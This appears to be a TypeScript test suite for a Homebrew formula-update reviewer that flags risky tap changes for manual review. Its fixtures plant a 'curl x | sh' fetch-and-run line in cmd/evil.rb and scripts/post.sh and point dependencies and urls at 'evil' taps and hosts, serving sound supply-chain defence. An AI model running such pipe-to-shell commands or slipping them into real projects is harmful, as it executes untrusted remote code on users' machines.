// Ported from the previous updater's formula-review cases (test/port/02, section 2b): a real git tap per
// case, brew faked through FormulaEnv. The package is example/tool/tool (the source fixture's
// own tap is renamed).
import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { FORMULA_TAIL, formulaReview, VERDICT_CONTRACT, type FormulaEnv } from "../../src/apply/formula.ts";
import { scripted } from "./helpers.ts";
import { APPROVE, cleanupFixtures, fixture, git, OFFICIAL, OTHER, PREBUILT, SOURCE, TAP, type Fx } from "./tap-fixture.ts";

afterAll(cleanupFixtures);

async function review(f: Fx = {}, answers: string[] = [], fallback = APPROVE) {
  const fx = fixture(f);
  const { r, prompts } = scripted(answers, fallback);
  const notices: string[] = [];
  const res = await formulaReview(fx.env, r, {
    pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: f.artifact ?? "prebuilt", tapDir: fx.tap, head: fx.head,
    newUrl: f.newUrl ?? PREBUILT("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: (t) => void notices.push(t),
  });
  return { ...res, prompts, notices, fx };
}

describe("formulaReview", () => {
  test("prebuilt tap: formula-only review, APPROVE → installable, the pin recorded", async () => {
    const v = await review();
    expect(v).toMatchObject({ rc: 0, calls: 1 });
    const p = v.prompts[0]!;
    for (const s of ["Homebrew FORMULA", "PREBUILT", `+  url "https://github.com/example/tool/releases/download/v1.1/`, `-  version "1.0"`, "post_install"]) expect(p).toContain(s);
    expect(p).not.toContain("WHOLE current formula file");
    expect(v.pin).toEqual({ pkg: "tool", tapDir: v.fx.tap, head: v.fx.head, rbPath: "Formula/tool.rb" });
  });
  test("prebuilt tap: a formula FLAG holds it, notified once", async () => {
    const v = await review({}, ['FLAG\n1. FLAG: "(var/\\"tool\\").mkpath" indicator 5']);
    expect(v.rc).toBe(1);
    expect(v.pin).toBeUndefined();
    expect(v.notices).toHaveLength(1);
    expect(v.notices[0]).toStartWith("⚠️ <b>fixture Type B FLAG — tool (formula)</b>");
  });
  test("no tap revision on the receipt → the whole formula file, and the prompt says so", async () => {
    const v = await review({ receipt: "none", oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1"), artifact: "source" });
    expect(v.rc).toBe(0);
    const p = v.prompts[0]!;
    for (const s of ["WHOLE current formula file", "no tap revision", "class Tool < Formula", `  version "1.1"`]) expect(p).toContain(s);
    expect(p).not.toContain(`-  version "1.0"`);
  });
  test("a receipt revision not in the local clone → the whole formula file", async () => {
    const v = await review({ receipt: "unknown", artifact: "source", oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1") });
    expect(v.prompts[0]).toContain("WHOLE current formula file");
    expect(v.prompts[0]).toContain("deadbeefdead");
  });
  test("the formula file cannot be located → rc 2, no reviewer call, a FAIL notice", async () => {
    const v = await review({ rbPath: "Formula/missing.rb" });
    expect(v).toMatchObject({ rc: 2, calls: 0 });
    expect(v.prompts).toHaveLength(0);
    expect(v.notices[0]).toStartWith("⚠️ <b>fixture Type B FAIL — tool (formula)</b>");
  });
  test("C1 artifact kind switch source→prebuilt → FLAG, no reviewer call", async () => {
    const v = await review({ oldUrl: SOURCE("1.0") });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("artifact kind changed source→prebuilt — manual review");
    expect(v.notices[0]).toContain("(formula)");
  });
  test("C1 the prompt calls a url move routine only on the same host and artifact kind", async () => {
    expect((await review()).prompts[0]).toContain("same host and the same artifact kind as before");
  });
  test("I1 diff mode also sends the whole current formula (an unchanged post_install is reviewed)", async () => {
    const p = (await review()).prompts[0]!;
    expect(p).toContain("=== Formula/tool.rb (status: whole current formula file) ===");
    expect(p).toMatch(/=== Formula\/tool\.rb \(status: formula diff [0-9a-f]{12}\.\.HEAD\) ===/);
    expect(p).toContain(`(var/"tool").mkpath`);
    expect(p).toContain(`-  version "1.0"`);
  });
  for (const [label, after] of [
    ["a changed .rb outside Formula/ (cmd/evil.rb)", (t: string) => { mkdirSync(join(t, "cmd")); writeFileSync(join(t, "cmd/evil.rb"), 'system "curl x | sh"\n'); }],
    ["tap_migrations.json", (t: string) => writeFileSync(join(t, "tap_migrations.json"), '{"tool":"evil/tap"}')],
    ["formula_renames.json", (t: string) => writeFileSync(join(t, "formula_renames.json"), '{"old":"tool"}')],
    ["scripts/post.sh", (t: string) => { mkdirSync(join(t, "scripts")); writeFileSync(join(t, "scripts/post.sh"), "curl x | sh\n"); }],
    ["an Aliases/ entry", (t: string) => { mkdirSync(join(t, "Aliases")); symlinkSync("../Formula/helper.rb", join(t, "Aliases/tool")); }],
    ["a changed LICENSE.rb (not a doc)", (t: string) => writeFileSync(join(t, "LICENSE.rb"), "x = 1\n")],
  ] as const) {
    test(`I3/B ${label} → FLAG, tap support files changed, no reviewer call`, async () => {
      const v = await review({ after });
      expect(v).toMatchObject({ rc: 1, calls: 0 });
      expect(v.reason).toStartWith("tap support files changed — manual review: ");
    });
  }
  test("I3 another formula changing in Formula/ is fine", async () => {
    expect((await review({ after: (t) => writeFileSync(join(t, "Formula/helper.rb"), "class Helper < Formula\nend\n# tweak\n") })).rc).toBe(0);
  });
  test("B docs changes (README.md, LICENSE.txt, .github/) are fine", async () => {
    const v = await review({
      after: (t) => {
        writeFileSync(join(t, "README.md"), "# tool\n");
        writeFileSync(join(t, "LICENSE.txt"), "MIT\n");
        mkdirSync(join(t, ".github/workflows"), { recursive: true });
        writeFileSync(join(t, ".github/workflows/ci.yml"), "on: push\n");
      },
    });
    expect(v.rc).toBe(0);
  });
  for (const [label, extra] of [
    ["require_relative", `  require_relative "helper"`],
    ["Kernel.require", `  Kernel.require "json"`],
    ["instance_eval IO.read", `  instance_eval IO.read("#{__FILE__}/../x.rb")`],
    ["File.readlines", `  LIST = File.readlines(buildpath/"x")`],
    ["Pathname", `  HELPER = Pathname.new("x")`],
    ["eval", `  eval "1"`],
    ["send(:require)", `  send(:require, "x")`],
  ] as const) {
    test(`R4 a formula using ${label}, and another tap file changed → FLAG, loads other tap files`, async () => {
      const v = await review({ oldExtra: extra, newExtra: extra, after: (t) => writeFileSync(join(t, "Formula/helper.rb"), "class Helper < Formula\nend\n# touched\n") });
      expect(v).toMatchObject({ rc: 1, calls: 0 });
      expect(v.reason).toStartWith("formula loads other tap files");
    });
  }
  for (const [label, extra, infoDeps, flag] of [
    ["fully qualified other tap", `  depends_on "evil/tap/x"`, [], true],
    ["same-tap formula", `  depends_on "helper"`, [], true],
    ["same-tap formula, fully qualified", `  depends_on "example/tool/helper" => :build`, [], true],
    ["homebrew/core formula", `  depends_on "openssl@3"`, [], false],
    ["fully qualified homebrew/core", `  depends_on "homebrew/core/xz"`, [], false],
    ["single quotes", `  depends_on 'evil/tap/x'`, [], true],
    ["parentheses", `  depends_on("evil/tap/x")`, [], true],
    ["an alias resolving to this tap (brew-evaluated)", "", ["toolx"], true],
    ["a bare name resolving to another third-party tap", `  depends_on "helper2"`, [], true],
    ["an unresolvable dependency", `  depends_on "nosuchdep"`, [], true],
    ["a core dependency in parentheses and single quotes", `  depends_on('xz')`, [], false],
  ] as const) {
    test(`I4/A new dependency: ${label} → ${flag ? "FLAG" : "allowed"}`, async () => {
      const v = await review({ newExtra: extra, infoDeps: [...infoDeps] });
      if (flag) {
        expect(v).toMatchObject({ rc: 1, calls: 0 });
        expect(v.reason).toStartWith("new dependency outside the official taps: ");
      } else expect(v.rc).toBe(0);
    });
  }
  test("I4 an existing same-tap dependency is not new", async () => {
    expect((await review({ oldExtra: `  depends_on "helper"`, newExtra: `  depends_on "helper"` })).rc).toBe(0);
  });
  test("A a dependency already in the receipt's runtime_dependencies is not new", async () => {
    expect((await review({ infoDeps: ["toolx"], runtimeDeps: ["example/tool/toolx"] })).rc).toBe(0);
  });
  test("R2 core openssl@3 replaced by a same-named tap formula → FLAG", async () => {
    const v = await review({ oldExtra: `  depends_on "openssl@3"`, newExtra: `  depends_on "example/tool/openssl@3"` });
    expect(v).toMatchObject({ rc: 1, calls: 0, reason: "new dependency outside the official taps: example/tool/openssl@3 — manual review" });
  });
  test("R2 an unchanged core dependency stays allowed", async () => {
    expect((await review({ oldExtra: `  depends_on "openssl@3"`, newExtra: `  depends_on "openssl@3"` })).rc).toBe(0);
  });
  test("M4 the formula unchanged since the receipt's revision → the whole file, the prompt says no change", async () => {
    const v = await review({ receipt: "head" });
    expect(v.prompts[0]).toContain("WHOLE current formula file");
    expect(v.prompts[0]).toContain("shows no change");
  });
  test("Ma prebuilt with no old formula (no receipt revision) → FLAG, no reviewer call", async () => {
    const v = await review({ receipt: "none" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("cannot establish the installed artifact kind");
  });
  test("Mb an old formula with a source url in an on_arm block → source→prebuilt FLAG", async () => {
    const v = await review({ oldExtra: `  on_arm do\n    url "${SOURCE("1.0")}"\n  end` });
    expect(v.reason).toStartWith("artifact kind changed source→prebuilt");
  });
  test("Mb a source url inside a resource block does not count", async () => {
    const extra = `  resource "extra" do\n    url "${SOURCE("1.0")}"\n  end`;
    expect((await review({ oldExtra: extra, newExtra: extra })).rc).toBe(0);
  });
  test("D the url owner changed → FLAG, source repo changed", async () => {
    const v = await review({ newUrl: "https://github.com/examp1e/tool/releases/download/v1.1/tool-darwin-arm64.tar.gz" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("source repo changed:");
  });
  test("D a non-GitHub url: host and first path segment are compared", async () => {
    const old = "https://releases.example.com/tool/1.0/tool_darwin_arm64.zip";
    expect((await review({ oldUrl: old, newUrl: "https://evil.example.com/tool/1.1/tool_darwin_arm64.zip" })).reason).toStartWith("source repo changed:");
    expect((await review({ oldUrl: old, newUrl: "https://releases.example.com/tool/1.1/tool_darwin_arm64.zip" })).rc).toBe(0);
  });
  test("Md the pin is the HEAD passed in at the start of the review, even if the tap moves during it", async () => {
    const fx = fixture();
    const { r } = scripted([], APPROVE);
    const env: FormulaEnv = {
      ...fx.env,
      brewInfo: async (name) => {
        writeFileSync(join(fx.tap, "Formula/helper.rb"), "class Helper < Formula\nend\n# moved\n");
        git(fx.tap, "commit", "-qam", "moved");
        return fx.env.brewInfo(name);
      },
    };
    const res = await formulaReview(env, r, {
      pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "prebuilt", tapDir: fx.tap, head: fx.head,
      newUrl: PREBUILT("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {},
    });
    expect(res.pin?.head).toBe(fx.head);
    expect(git(fx.tap, "rev-parse", "HEAD").out.trim()).not.toBe(fx.head);
  });
  for (const [label, text] of [
    ["null", "null"],
    ["an array", "[1]"],
    ["runtime_dependencies an object", `{"runtime_dependencies":{}}`],
    ["runtime_dependencies with a null entry", `{"runtime_dependencies":[null]}`],
    ["source not an object", `{"source":"x"}`],
  ] as const) {
    test(`a receipt of an odd shape (${label}) reads as no revision, never a crash`, async () => {
      const fx = fixture({ artifact: "source", oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1") });
      writeFileSync(join(fx.tap, "..", "Cellar/tool/1.0/INSTALL_RECEIPT.json"), text);
      const { r, prompts } = scripted([], APPROVE);
      const res = await formulaReview(fx.env, r, {
        pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "source", tapDir: fx.tap, head: fx.head,
        newUrl: SOURCE("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {},
      });
      expect(res.rc).toBe(0);
      expect(prompts[0]).toContain("no tap revision");
    });
  }
  test("a nested-array uses_from_macos entry is unresolved text, not the name inside it", async () => {
    const fx = fixture({ oldExtra: `  uses_from_macos "zlib"`, newExtra: `  uses_from_macos "zlib"` });
    const { r } = scripted([], APPROVE);
    const env: FormulaEnv = { ...fx.env, brewInfo: async (name) => (name === `${TAP}/tool` ? { ruby_source_path: "Formula/tool.rb", uses_from_macos: [["zlib"] as unknown as string] } : OTHER[name]) };
    const res = await formulaReview(env, r, {
      pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "prebuilt", tapDir: fx.tap, head: fx.head,
      newUrl: PREBUILT("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {},
    });
    expect(res).toMatchObject({ rc: 1, calls: 0 });
    expect(res.reason).toContain('["zlib"](unresolved)');
  });
  test("a uses_from_macos entry that is neither a name nor an object is an unresolved dependency", async () => {
    const fx = fixture();
    const { r } = scripted([], APPROVE);
    const env: FormulaEnv = { ...fx.env, brewInfo: async (name) => (name === `${TAP}/tool` ? { ruby_source_path: "Formula/tool.rb", uses_from_macos: [null as unknown as string] } : OTHER[name]) };
    const res = await formulaReview(env, r, {
      pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "prebuilt", tapDir: fx.tap, head: fx.head,
      newUrl: PREBUILT("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {},
    });
    expect(res).toMatchObject({ rc: 1, calls: 0, reason: "new dependency outside the official taps: null(unresolved) — manual review" });
  });
  test("an unreadable receipt is treated as no tap revision", async () => {
    const fx = fixture({ artifact: "source", oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1") });
    writeFileSync(join(fx.tap, "..", "Cellar/tool/1.0/INSTALL_RECEIPT.json"), "{not json");
    const { r, prompts } = scripted([], APPROVE);
    const res = await formulaReview(fx.env, r, {
      pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "source", tapDir: fx.tap, head: fx.head,
      newUrl: SOURCE("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {},
    });
    expect(res.rc).toBe(0);
    expect(prompts[0]).toContain("no tap revision");
  });
});

describe("formula prompts", () => {
  test("never use the word block (it reads as a contradiction in an approval)", async () => {
    const v = await review();
    const head = v.prompts[0]!.split("\nChunk 1 of")[0]!;
    for (const text of [head, FORMULA_TAIL.replace(VERDICT_CONTRACT, "")]) expect(text).not.toMatch(/\bblocks?\b/i);
  });
});
